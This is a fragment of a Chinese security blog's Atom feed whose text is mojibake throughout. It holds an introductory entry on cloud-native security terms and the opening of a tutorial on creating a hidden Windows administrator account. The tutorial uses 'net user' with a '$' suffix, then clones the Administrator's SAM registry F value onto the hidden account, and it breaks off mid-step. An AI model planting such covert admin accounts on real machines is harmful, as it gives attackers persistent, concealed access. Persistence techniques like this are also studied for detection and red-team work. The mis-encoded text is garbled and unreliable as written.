href="https://docs.docker.com/get-started/overview/">https://docs.docker.com/get-started/overview/</a></p><p> <a href="https://www.freebuf.com/articles/web/258398.html">https://www.freebuf.com/articles/web/258398.html</a></p><p> <a href="https://cloud.tencent.com/developer/article/1428102">https://cloud.tencent.com/developer/article/1428102</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;ä»¥ä¸‹å†…å®¹ä¸ºè‡ªå·±ä¸ªäººçš„å­¦ä¹ ç¬”è®°ï¼Œå› æ­¤å†…å®¹ä¸ä¼šå¤šä¹ˆè¯¦å®ï¼›å…¶ä¸­æœ‰äº›å†…å®¹ä¹Ÿè®¸ä¼šå­˜åœ¨é”™è¯¯ï¼Œå¦‚æœ‰é”™è¯¯æ¬¢è¿ç•™è¨€å¤„æŒ‡å‡ºï¼Œè¿˜æœ›è°…è§£ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;heade</summary>
      
    
    
    
    <category term="äº‘å®‰å…¨" scheme="https://www.teamssix.com/categories/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="äº‘å®‰å…¨" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    <category term="äº‘åŸç”Ÿ" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%8E%9F%E7%94%9F/"/>
    
    <category term="ç¬”è®°" scheme="https://www.teamssix.com/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="å®¹å™¨" scheme="https://www.teamssix.com/tags/%E5%AE%B9%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>ã€äº‘å®‰å…¨ã€‘äº‘åŸç”Ÿå®‰å…¨æ˜¯ä»€ä¹ˆï¼Ÿ</title>
    <link href="https://www.teamssix.com/220217-160755.html"/>
    <id>https://www.teamssix.com/220217-160755.html</id>
    <published>2022-02-17T08:07:55.000Z</published>
    <updated>2022-02-17T08:19:31.809Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h1><p>æœ€è¿‘åœ¨æ¥è§¦äº‘åŸç”Ÿå®‰å…¨çš„æ—¶å€™ç¢°åˆ°äº†ä¸å°‘ä»¥å‰ä¸çŸ¥é“ã€ä¸ç†Ÿæ‚‰çš„åè¯ã€æŠ€æœ¯ç­‰ç­‰ï¼Œæ•…åœ¨æ­¤åšä¸ªç¬”è®°è®°å½•ä¸€ä¸‹ã€‚</p><h1 id="0x01-ä¸€äº›åè¯ä»‹ç»"><a href="#0x01-ä¸€äº›åè¯ä»‹ç»" class="headerlink" title="0x01 ä¸€äº›åè¯ä»‹ç»"></a>0x01 ä¸€äº›åè¯ä»‹ç»</h1><h2 id="å®¹å™¨ç¼–æ’"><a href="#å®¹å™¨ç¼–æ’" class="headerlink" title="å®¹å™¨ç¼–æ’"></a>å®¹å™¨ç¼–æ’</h2><p>å®¹å™¨ç¼–æ’ï¼ˆContainer Orchestrationï¼‰æ˜¯æŒ‡è‡ªåŠ¨åŒ–å®¹å™¨çš„éƒ¨ç½²ã€ç®¡ç†ã€æ‰©å±•å’Œè”ç½‘ï¼Œå®¹å™¨ç¼–æ’å¯ä»¥ä¸ºéœ€è¦éƒ¨ç½²å’Œç®¡ç†æˆç™¾ä¸Šåƒä¸ª Linux å®¹å™¨å’Œä¸»æœºçš„ä¼ä¸šæä¾›ä¾¿åˆ©ã€‚</p><p>å¸¸è§çš„å®¹å™¨ç¼–æ’å·¥å…·æ–¹æ¡ˆæœ‰ Kubernetesã€Docker Swarm å’Œ Apache Mesos ç­‰ã€‚</p><p>ä»¥ä¸‹æ˜¯ Sysdig åœ¨ 2021 å¹´ç»™å‡ºçš„å®¹å™¨ç¼–æ’å·¥å…·æµè¡Œåº¦å›¾è¡¨ï¼Œå¯ä»¥çœ‹åˆ° Kubernetes å¯è°“æ˜¯ä¸€éª‘ç»å°˜ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202202171557036.png"></p><p>å›¾ç‰‡æ¥æºï¼š<a href="https://dig.sysdig.com/c/pf-2021-container-security-and-usage-report?x=u_WFRi&amp;utm_source=gated-organic&amp;utm_medium=website">https://dig.sysdig.com/c/pf-2021-container-security-and-usage-report?x=u_WFRi&amp;utm_source=gated-organic&amp;utm_medium=website</a></p><h2 id="æ— æœåŠ¡"><a href="#æ— æœåŠ¡" class="headerlink" title="æ— æœåŠ¡"></a>æ— æœåŠ¡</h2><p>æ— æœåŠ¡ï¼ˆServerlessï¼‰æ˜¯ä¸€ç§äº‘åŸç”Ÿå¼€å‘æ¨¡å‹ï¼Œå¯ä½¿å¼€å‘äººå‘˜ä¸“æ³¨æ„å»ºå’Œè¿è¡Œåº”ç”¨ï¼Œè¿™å¹¶ä¸æ˜¯è¯´æ²¡æœ‰æœåŠ¡å™¨ï¼Œè€Œæ˜¯è¯´å¼€å‘è€…ä¸ç”¨å»ç®¡æœåŠ¡å™¨åªè´Ÿè´£å¼€å‘å°±è¡Œã€‚</p><p>æ— æœåŠ¡è®¡ç®—äº§å“é€šå¸¸è¢«åˆ†ä¸ºä¸¤ç±»ï¼Œåˆ†åˆ«æ˜¯åç«¯å³æœåŠ¡ï¼ˆBaaSï¼‰å’Œå‡½æ•°å³æœåŠ¡ï¼ˆFaaSï¼‰ï¼Œå…¶ä¸­ FaaS æ˜¯ Serverless çš„ä¸»è¦å®ç°æ–¹å¼ï¼ŒFaaS çš„ç›¸å…³äº§å“ä¸»è¦æœ‰ AWS çš„ Lambdaã€Azure çš„  Functions Serverless Computeã€GCP çš„ Firebase Cloud Functionsã€é˜¿é‡Œäº‘çš„ Function Compute ç­‰ã€‚</p><h2 id="å¾®æœåŠ¡"><a href="#å¾®æœåŠ¡" class="headerlink" title="å¾®æœåŠ¡"></a>å¾®æœåŠ¡</h2><p>å¾®æœåŠ¡ï¼ˆMicroservicesï¼‰æ˜¯ä¸€ç§è½¯ä»¶æ¶æ„é£æ ¼ï¼Œå®ƒæ˜¯ä»¥ä¸“æ³¨äºå•ä¸€è´£ä»»ä¸åŠŸèƒ½çš„å°å‹åŠŸèƒ½åŒºå—ä¸ºåŸºç¡€ï¼Œåˆ©ç”¨æ¨¡å—åŒ–çš„æ–¹å¼ç»„åˆå‡ºå¤æ‚çš„å¤§å‹åº”ç”¨ç¨‹åºï¼Œå„åŠŸèƒ½åŒºå—ä½¿ç”¨ä¸è¯­è¨€æ— å…³çš„APIé›†ç›¸äº’é€šä¿¡ã€‚</p><p>è¿™ä¸ªæ˜¯ Wiki ä¸Šç»™å‡ºçš„å®šä¹‰ï¼Œå¦‚æœå…·ä½“çš„æƒ³äº†è§£å¾®æœåŠ¡æ˜¯ä»€ä¹ˆå¯ä»¥çœ‹çŸ¥ä¹ä¸Šçš„è¿™ä¸ªå¸–å­ï¼š<a href="https://www.zhihu.com/question/65502802">https://www.zhihu.com/question/65502802</a></p><h2 id="æœåŠ¡ç½‘æ ¼"><a href="#æœåŠ¡ç½‘æ ¼" class="headerlink" title="æœåŠ¡ç½‘æ ¼"></a>æœåŠ¡ç½‘æ ¼</h2><p>æœåŠ¡ç½‘æ ¼ï¼ˆService Meshï¼‰ç”¨äºæ§åˆ¶åº”ç”¨çš„ä¸åŒéƒ¨åˆ†ä¹‹é—´å¦‚ä½•å…±äº«æ•°æ®ï¼ŒæœåŠ¡ç½‘æ ¼å†…ç½®äºåº”ç”¨ç¨‹åºä¸­çš„ä¸“ç”¨åŸºç¡€æ¶æ„å±‚ï¼Œè¿™ä¸ªå¯è§çš„åŸºç¡€æ¶æ„å±‚å¯ä»¥è®°å½•åº”ç”¨çš„ä¸åŒéƒ¨åˆ†æ˜¯å¦èƒ½æ­£å¸¸äº¤äº’ã€‚</p><p>åœ¨æœåŠ¡ç½‘æ ¼ä¸­ï¼Œè¯·æ±‚å°†é€šè¿‡æ‰€åœ¨åŸºç¡€æ¶æ„å±‚ä¸­çš„ä»£ç†åœ¨å¾®æœåŠ¡ä¹‹é—´è·¯ç”±ï¼Œæ„æˆæœåŠ¡ç½‘æ ¼çš„å„ä¸ªä»£ç†æœ‰æ—¶è¢«ç§°ä¸ºâ€sidecarâ€</p><p>å¦‚æœæ²¡æœ‰æœåŠ¡ç½‘æ ¼ï¼Œæ¯é¡¹å¾®æœåŠ¡éƒ½éœ€è¦è¿›è¡Œé€»è¾‘ç¼–ç ï¼Œæ‰èƒ½ç®¡ç†æœåŠ¡é—´é€šä¿¡ï¼Œè¿™ä¼šå¯¼è‡´å¼€å‘äººå‘˜æ— æ³•ä¸“æ³¨äºä¸šåŠ¡ç›®æ ‡ï¼ŒåŒæ—¶ï¼Œè¿™ä¹Ÿæ„å‘³ç€é€šä¿¡æ•…éšœéš¾ä»¥è¯Šæ–­ï¼Œå› ä¸ºç®¡ç†æœåŠ¡é—´é€šä¿¡çš„é€»è¾‘éšè—åœ¨æ¯é¡¹æœåŠ¡ä¸­ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202202171557782.png"></p><h2 id="CNCF"><a href="#CNCF" class="headerlink" title="CNCF"></a>CNCF</h2><p>CNCF (Cloud Native Computing Foundation) äº‘åŸç”Ÿè®¡ç®—åŸºé‡‘ä¼šï¼Œäº 2015 å¹´7æœˆ21æ—¥æˆç«‹ï¼Œéš¶å±äº Linux åŸºé‡‘ä¼šï¼ŒCNCF çš„å£å·æ˜¯åšæŒå’Œæ•´åˆå¼€æºæŠ€æœ¯æ¥ç¼–æ’å®¹å™¨ä½œä¸ºå¾®æœåŠ¡æ¶æ„çš„ä¸€éƒ¨åˆ†ã€‚</p><p>CNCF æ˜¯ä¸€ä¸ªå­µåŒ–ã€è¿è¥äº‘åŸç”Ÿç”Ÿæ€çš„ä¸­ç«‹ç»„ç»‡ï¼ŒCNCF å¯¹äºäº‘åŸç”Ÿåº”ç”¨çš„æ¨å¹¿å’Œæ™®åŠå‘æŒ¥ç€é‡è¦çš„ä½œç”¨ã€‚</p><p>åœ¨ landscape.cncf.io å¯ä»¥çœ‹åˆ°ç”± CNCF æ‰€ç»´æŠ¤çš„äº‘åŸç”Ÿå…¨æ™¯å›¾ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202202171558254.png"></p><h1 id="0x02-äº‘åŸç”Ÿå®‰å…¨"><a href="#0x02-äº‘åŸç”Ÿå®‰å…¨" class="headerlink" title="0x02 äº‘åŸç”Ÿå®‰å…¨"></a>0x02 äº‘åŸç”Ÿå®‰å…¨</h1><h2 id="äº‘åŸç”Ÿ"><a href="#äº‘åŸç”Ÿ" class="headerlink" title="äº‘åŸç”Ÿ"></a>äº‘åŸç”Ÿ</h2><p>äº‘åŸç”Ÿï¼ˆCloud Nativeï¼‰å¯ä»¥æ‹†åˆ†æˆã€Œäº‘ã€å’Œã€ŒåŸç”Ÿã€å»çœ‹ã€‚</p><p>ã€Œäº‘ã€ç›¸å¯¹çš„å°±æ˜¯æœ¬åœ°ï¼Œä¼ ç»Ÿåº”ç”¨éƒ½è·‘åœ¨æœ¬åœ°æœåŠ¡å™¨ä¸Šï¼Œè€Œäº‘åˆ™è¡¨ç¤ºè·‘åœ¨äº‘æœåŠ¡å™¨ä¸Šã€‚</p><p>ã€ŒåŸç”Ÿã€åˆ™å¯ä»¥ç®€å•çš„ç†è§£æˆå‡ºç”Ÿåœ°çš„æ„æ€ï¼Œæ”¾åœ¨äº‘ç¯å¢ƒä¸­æ‰€è¡¨è¾¾çš„æ„æ€å°±æ˜¯ï¼šåœ¨æŠŠåº”ç”¨è·‘åˆ°äº‘æœåŠ¡å™¨ä¸Šæ—¶ï¼Œåº”è¯¥å……åˆ†çš„åˆ©ç”¨äº‘è‡ªèº«çš„ç‰¹ç‚¹ï¼Œæ¯”å¦‚å¼¹æ€§å’Œåˆ†å¸ƒå¼ä¼˜åŠ¿ã€‚</p><p>å¦‚æœåªæ˜¯ç®€å•çš„æŠŠåŸæ¥æœ¬åœ°è·‘çš„ä¸šåŠ¡æ”¾åˆ°äº‘ä¸Šï¼Œé«˜ä¸¾â€œä¸Šäº‘â€å¤§æ——ï¼Œé‚£åªèƒ½å«åšâ€œæ‹†è¿æˆ·â€ï¼Œä¸èƒ½å«åšäº‘åŸç”Ÿï¼›å½“â€œä¸Šäº‘â€çš„é£æ½®è¿‡å»åï¼Œå¼€å§‹å‡ºç°äº†ç›´æ¥å°±éƒ¨ç½²åœ¨äº‘ä¸Šçš„ä¸šåŠ¡ï¼Œè¿™äº›ä¸šåŠ¡å®Œå…¨æŒ‰ç…§â€œäº‘â€çš„ç‰¹ç‚¹å»è®¾è®¡ï¼Œè¿™ç§æ˜¯â€œäº‘â€çš„åŸä½æ°‘ï¼Œå¯ä»¥å«åšäº‘åŸç”Ÿã€‚</p><p>CNCF å¯¹äºäº‘åŸç”Ÿçš„è§è§£ä¸ºï¼š</p><p>äº‘åŸç”ŸæŠ€æœ¯æœ‰åˆ©äºå„ç»„ç»‡åœ¨å…¬æœ‰äº‘ã€ç§æœ‰äº‘å’Œæ··åˆäº‘ç­‰æ–°å‹åŠ¨æ€ç¯å¢ƒä¸­ï¼Œæ„å»ºå’Œè¿è¡Œå¯å¼¹æ€§æ‰©å±•çš„åº”ç”¨ã€‚äº‘åŸç”Ÿçš„ä»£è¡¨æŠ€æœ¯åŒ…æ‹¬å®¹å™¨ã€æœåŠ¡ç½‘æ ¼ã€å¾®æœåŠ¡ã€ä¸å¯å˜åŸºç¡€è®¾æ–½å’Œå£°æ˜å¼ APIã€‚</p><p>è¿™äº›æŠ€æœ¯èƒ½å¤Ÿæ„å»ºå®¹é”™æ€§å¥½ã€æ˜“äºç®¡ç†å’Œä¾¿äºè§‚å¯Ÿçš„æ¾è€¦åˆç³»ç»Ÿã€‚ç»“åˆå¯é çš„è‡ªåŠ¨åŒ–æ‰‹æ®µï¼Œäº‘åŸç”ŸæŠ€æœ¯ä½¿å·¥ç¨‹å¸ˆèƒ½å¤Ÿè½»æ¾åœ°å¯¹ç³»ç»Ÿä½œå‡ºé¢‘ç¹å’Œå¯é¢„æµ‹çš„é‡å¤§å˜æ›´ã€‚</p><p>å¯¹äºäº‘åŸç”Ÿç³»ç»Ÿä¸€èˆ¬æœ‰ä»¥ä¸‹ç‰¹å¾ï¼š</p><ul><li><p>è½»ã€å¿«ã€ä¸å˜çš„åŸºç¡€è®¾æ–½</p></li><li><p>å¼¹æ€§æœåŠ¡ç¼–æ’</p></li><li><p>å¼€å‘è¿è¥ä¸€ä½“åŒ–</p></li><li><p>å¾®æœåŠ¡æ¶æ„</p></li><li><p>æ— æœåŠ¡æ¨¡å‹</p></li></ul><h2 id="äº‘åŸç”Ÿå®‰å…¨"><a href="#äº‘åŸç”Ÿå®‰å…¨" class="headerlink" title="äº‘åŸç”Ÿå®‰å…¨"></a>äº‘åŸç”Ÿå®‰å…¨</h2><p>åœ¨ä»‹ç»å®Œäº‘åŸç”Ÿåï¼Œäº‘åŸç”Ÿå®‰å…¨å°±å˜å¾—å®¹æ˜“ç†è§£äº†ï¼Œäº‘åŸç”Ÿå®‰å…¨è‡³å°‘åŒ…å«äº†å¾®æœåŠ¡å®‰å…¨ã€æ— æœåŠ¡å®‰å…¨ã€ç¼–æ’å¹³å°å®‰å…¨ã€æœåŠ¡ç½‘æ ¼å®‰å…¨ã€å®¹å™¨å®‰å…¨ã€å®¿ä¸»æœºå®‰å…¨ç­‰ç­‰ã€‚</p><p>æ ¹æ®äº‘åŸç”Ÿç¯å¢ƒçš„æ„æˆï¼Œé¢å‘äº‘åŸç”Ÿç¯å¢ƒçš„å®‰å…¨ä½“ç³»å¯ä»¥æ¦‚æ‹¬ä¸ºä»¥ä¸‹ä¸‰ä¸ªå±‚é¢ï¼š</p><ul><li><p>å®¹å™¨å®‰å…¨</p></li><li><p>ç¼–æ’ç³»ç»Ÿå®‰å…¨</p></li><li><p>äº‘åŸç”Ÿåº”ç”¨å®‰å…¨ï¼šåŒ…æ‹¬äº†å¾®æœåŠ¡ã€æ— æœåŠ¡ã€æœåŠ¡ç½‘æ ¼ã€é›¶ä¿¡ä»»ä½“ç³»ã€API å®‰å…¨ç­‰ç­‰</p></li></ul><p>å¦å¤–é™¤äº†è¿™äº›å’Œäº‘åŸç”Ÿç¯å¢ƒç›¸å…³çš„æŠ€æœ¯ä¹‹å¤–ï¼Œäº‘åŸç”Ÿå®‰å…¨è¿˜åŒ…å«äº†ä¸€äº›ä¼ ç»Ÿå®‰å…¨çš„å†…å®¹ï¼Œæ¯”å¦‚å®¿ä¸»æœºçš„å®‰å…¨ç­‰ç­‰ã€‚</p><blockquote><p>æ›´å¤šä¿¡æ¯æ¬¢è¿å…³æ³¨æˆ‘çš„å¾®ä¿¡å…¬ä¼—å·ï¼šTeamsSix</p><p>å‚è€ƒé“¾æ¥ï¼š</p><p>ã€Šäº‘åŸç”Ÿå®‰å…¨-æ”»é˜²å®è·µä¸ä½“ç³»æ„å»ºã€‹</p><p><a href="https://www.jianshu.com/p/a37baa7c3eff">https://www.jianshu.com/p/a37baa7c3eff</a></p><p><a href="https://www.51cto.com/article/652294.html">https://www.51cto.com/article/652294.html</a></p><p><a href="https://jimmysong.io/kubernetes-handbook/cloud-native/cncf.html">https://jimmysong.io/kubernetes-handbook/cloud-native/cncf.html</a></p><p><a href="https://zh.wikipedia.org/wiki/%E5%BE%AE%E6%9C%8D%E5%8B%99">https://zh.wikipedia.org/wiki/%E5%BE%AE%E6%9C%8D%E5%8B%99</a></p><p><a href="https://www.redhat.com/zh/topics/cloud-native-apps/what-is-serverless">https://www.redhat.com/zh/topics/cloud-native-apps/what-is-serverless</a></p><p><a href="https://www.redhat.com/zh/topics/microservices/what-is-a-service-mesh">https://www.redhat.com/zh/topics/microservices/what-is-a-service-mesh</a></p><p><a href="https://decodezp.github.io/2020/05/23/quickwords43-what-is-cloudnative/">https://decodezp.github.io/2020/05/23/quickwords43-what-is-cloudnative</a></p><p><a href="https://www.redhat.com/zh/topics/containers/what-is-container-orchestration">https://www.redhat.com/zh/topics/containers/what-is-container-orchestration</a></p><p><a href="https://jimmysong.io/kubernetes-handbook/cloud-native/cloud-native-definition.html">https://jimmysong.io/kubernetes-handbook/cloud-native/cloud-native-definition.html</a></p><p><a href="https://www.cncf.io/announcements/2015/06/21/new-cloud-native-computing-foundation-to-drive-alignment-among-container-technologies/">https://www.cncf.io/announcements/2015/06/21/new-cloud-native-computing-foundation-to-drive-alignment-among-container-technologies/</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00 å‰è¨€&quot;&gt;&lt;/a&gt;0x00 å‰è¨€&lt;/h1&gt;&lt;p&gt;æœ€è¿‘åœ¨æ¥è§¦äº‘åŸç”Ÿå®‰å…¨çš„æ—¶å€™ç¢°åˆ°äº†ä¸å°‘ä»¥å‰ä¸çŸ¥é“ã€ä¸ç†Ÿæ‚‰çš„åè¯ã€æŠ€æœ¯ç­‰ç­‰ï¼Œæ•…åœ¨æ­¤åšä¸ªç¬”è®°è®°å½•ä¸€ä¸‹ã€‚&lt;/</summary>
      
    
    
    
    <category term="äº‘å®‰å…¨" scheme="https://www.teamssix.com/categories/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="äº‘å®‰å…¨" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    <category term="äº‘åŸç”Ÿ" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%8E%9F%E7%94%9F/"/>
    
    <category term="ç¬”è®°" scheme="https://www.teamssix.com/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>ã€å·¥å…·åˆ†äº«ã€‘ä¸€é”®åˆ›å»ºéšè—è´¦å·</title>
    <link href="https://www.teamssix.com/220118-134825.html"/>
    <id>https://www.teamssix.com/220118-134825.html</id>
    <published>2022-01-18T05:48:25.000Z</published>
    <updated>2022-02-17T08:07:18.652Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h1><p>æœ€è¿‘åœ¨å¯¹ä»¥å‰æ‰€åšçš„ç¬”è®°è¿›è¡Œæ¢³ç†çš„æ—¶å€™ï¼Œå‘ç°è¿˜æ²¡è®°å½•è¿‡éšè—è´¦å·çš„ç¬”è®°ï¼Œè¿™é‡Œå°±è¡¥å……ä¸€ä¸‹ã€‚</p><p>åœ¨è¡¥å……çš„è¿‡ç¨‹ä¸­å‘ç°ï¼Œåˆ©ç”¨æ³¨å†Œè¡¨åˆ›å»ºéšè—è´¦å·çš„æ–¹æ³•è¿˜æ˜¯æŒºç¹ççš„ï¼Œè™½ç„¶å·²ç»æœ‰ä¸€é”®åŒ–çš„å·¥å…·ï¼Œä½†æ˜¯ä½¿ç”¨èµ·æ¥éƒ½ä¸æ˜¯å¤ªé¡ºæ‰‹ï¼Œå¦å¤–åœ¨ä½¿ç”¨æŸæ¬¾å·¥å…·çš„è¿‡ç¨‹ä¸­è¿˜æŠŠæˆ‘è™šæ‹Ÿæœºå¹²ç‚¸äº†ï¼Œå¹¸å¥½æ‰“çš„æœ‰å¿«ç…§ã€‚</p><p>æ—¢ç„¶æ²¡æœ‰é¡ºæ‰‹çš„ï¼Œé‚£å°±è‡ªå·±å†™ä¸€ä¸ªå§ï¼Œä¸è¿‡åœ¨æ­¤ä¹‹å‰ï¼Œè¿˜æ˜¯å…ˆçœ‹çœ‹æ‰‹åŠ¨æ˜¯æ€ä¹ˆåˆ›å»ºéšè—è´¦å·çš„ã€‚</p><h1 id="0x01-æ‰‹åŠ¨åˆ›å»ºéšè—è´¦å·ä¸å‘ç°çš„æ–¹æ³•"><a href="#0x01-æ‰‹åŠ¨åˆ›å»ºéšè—è´¦å·ä¸å‘ç°çš„æ–¹æ³•" class="headerlink" title="0x01 æ‰‹åŠ¨åˆ›å»ºéšè—è´¦å·ä¸å‘ç°çš„æ–¹æ³•"></a>0x01 æ‰‹åŠ¨åˆ›å»ºéšè—è´¦å·ä¸å‘ç°çš„æ–¹æ³•</h1><h2 id="æ–¹æ³•ä¸€ï¼šæ·»åŠ -ç¬¦"><a href="#æ–¹æ³•ä¸€ï¼šæ·»åŠ -ç¬¦" class="headerlink" title="æ–¹æ³•ä¸€ï¼šæ·»åŠ  $ ç¬¦"></a>æ–¹æ³•ä¸€ï¼šæ·»åŠ  $ ç¬¦</h2><p>æ·»åŠ éšè—ç”¨æˆ·å¹¶æ·»åŠ åˆ°ç®¡ç†å‘˜ç»„</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">net user teamssix$ Passw0rd <span class="token operator">/</span>addnet localgroup administrators teamssix$ <span class="token operator">/</span>add<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181400117.png"></p><p>åœ¨ä½¿ç”¨ net user æŸ¥çœ‹å½“å‰ç”¨æˆ·æ—¶ï¼Œæ˜¯çœ‹ä¸åˆ°è¿™ä¸ªç”¨æˆ·çš„ï¼Œä½†æ˜¯åœ¨æ§åˆ¶é¢æ¿é‡Œå¯ä»¥çœ‹åˆ°è¯¥ç”¨æˆ·</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181401187.png"></p><p>ä½¿ç”¨ wmic ä¹Ÿèƒ½çœ‹åˆ°è¯¥ç”¨æˆ·</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">wmic useraccount get Name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181402599.png"></p><p>åˆ é™¤è¯¥ç”¨æˆ·ç›´æ¥ç”¨ net user å³å¯</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">net user teamssix$ <span class="token operator">/</span>del<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181401888.png"></p><h2 id="æ–¹æ³•äºŒï¼šä¿®æ”¹æ³¨å†Œè¡¨"><a href="#æ–¹æ³•äºŒï¼šä¿®æ”¹æ³¨å†Œè¡¨" class="headerlink" title="æ–¹æ³•äºŒï¼šä¿®æ”¹æ³¨å†Œè¡¨"></a>æ–¹æ³•äºŒï¼šä¿®æ”¹æ³¨å†Œè¡¨</h2><p>æ‰“å¼€æ³¨å†Œè¡¨</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">HKEY_LOCAL_MACHINE\SAM\SAM\<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>èµ‹äºˆç®¡ç†å‘˜ç”¨æˆ·å®Œå…¨æ§åˆ¶çš„æƒé™</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181402115.png"></p><p>å…³é—­æ³¨å†Œè¡¨ï¼Œå†æ¬¡æ¥åˆ°åˆšæ‰çš„è·¯å¾„ï¼Œè¿™æ—¶å°±å¯ä»¥çœ‹åˆ° SAM æ–‡ä»¶å¤¹é‡Œçš„å†…å®¹äº†</p><p>è¿™æ—¶éœ€è¦å¯¼å‡ºä¸‰ä¸ªæ–‡ä»¶ï¼š</p><ul><li>Users ä¸‹çš„ç®¡ç†å‘˜æ–‡ä»¶</li><li>Users ä¸‹çš„éšè—è´¦å·æ–‡ä»¶</li><li>Names ä¸‹çš„éšè—è´¦å·æ–‡ä»¶</li></ul><p>Users ä¸‹çš„æ–‡ä»¶åå¯èƒ½ä¸å¤ªå¥½åˆ¤æ–­å½’å±é‚£ä¸ªç”¨æˆ·ï¼Œä¸è¿‡åœ¨é€‰æ‹© Names ä¸‹çš„ç”¨æˆ·æ—¶ï¼Œå¯ä»¥çœ‹åˆ°ç›¸åº”çš„ç±»å‹å€¼ï¼Œæ¯”å¦‚ teamssix$ è´¦å·å¯¹åº”çš„æ˜¯ 0x3eaï¼Œé‚£ä¹ˆ Users ä¸‹çš„æ–‡ä»¶å¤¹å°±æ˜¯ 000003EAï¼ŒåŒç†æ‰¾åˆ°ç®¡ç†å‘˜ Administrator å¯¹åº”çš„æ˜¯ 00001F4</p><p>æ‰¾åˆ°è¿™ä¸‰ä¸ªæ–‡ä»¶åï¼Œå³å‡»é€‰æ‹©å¯¼å‡º</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181402156.png"></p><p>ä½¿ç”¨è®°äº‹æœ¬æ‰“å¼€å¯¼å‡ºçš„ Users ä¸‹çš„ä¸¤ä¸ªæ–‡ä»¶ï¼Œå°† Administrator ä¸­çš„ F é”®å€¼å†…å®¹è¿›è¡Œæ›¿æ¢åˆ° teamssix$ ä¸­</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181403665.png"></p><p>ç„¶ååˆ é™¤ teamssix$ ç”¨æˆ·</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">net user teamssix$ <span class="token operator">/</span>del<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181401888.png"></p><p>è¿™ä¸ªæ—¶å€™å…¶å® teamssix$ ç”¨æˆ·å°±è¢«åˆ æ‰äº†ï¼Œç„¶ååˆ©ç”¨åˆšæ‰çš„æ³¨å†Œè¡¨æ–‡ä»¶å†æ·»åŠ ä¸Š teamssix$ ç”¨æˆ·</p><p>åŒå‡»åˆšæ‰å¯¼å‡ºçš„ Users ä¸‹çš„ teamssix$ æ–‡ä»¶å’Œ Names ä¸‹çš„ teamssix$ æ–‡ä»¶ã€‚</p><p>æ­¤æ—¶ï¼Œåˆ©ç”¨æ³¨å†Œè¡¨æ–°å»ºéšè—è´¦å·å°±åšå¥½äº†ï¼Œä¸ç®¡æ˜¯ net user è¿˜æ˜¯æ§åˆ¶é¢æ¿éƒ½çœ‹ä¸åˆ°è¯¥ç”¨æˆ·ã€‚</p><p>ä½¿ç”¨ net user teamssix$ èƒ½çœ‹åˆ°è¯¥ç”¨æˆ·ï¼Œè¯´æ˜è¯¥ç”¨æˆ·æ˜¯å­˜åœ¨çš„ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181403858.png"></p><p>ä»ä¸Šé¢å›¾ç‰‡å¯ä»¥çœ‹åˆ°å…¶å®è´¦å·æ˜¯ç¦ç”¨çš„çŠ¶æ€ï¼Œå› æ­¤æƒ³ä½¿ç”¨è¿™ä¸ªè´¦å·ï¼Œè¿˜å¾—ç»™å®ƒå¯ç”¨æ‰è¡Œ</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">net user teamssix$ <span class="token operator">/</span>active<span class="token punctuation">:</span>yes<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœæƒ³åˆ é™¤è¿™ä¸ªè´¦å·ï¼Œåœ¨æ³¨å†Œè¡¨ä¸­åˆ é™¤ Users ä¸‹çš„ 000003EA å’Œ Names ä¸‹çš„ 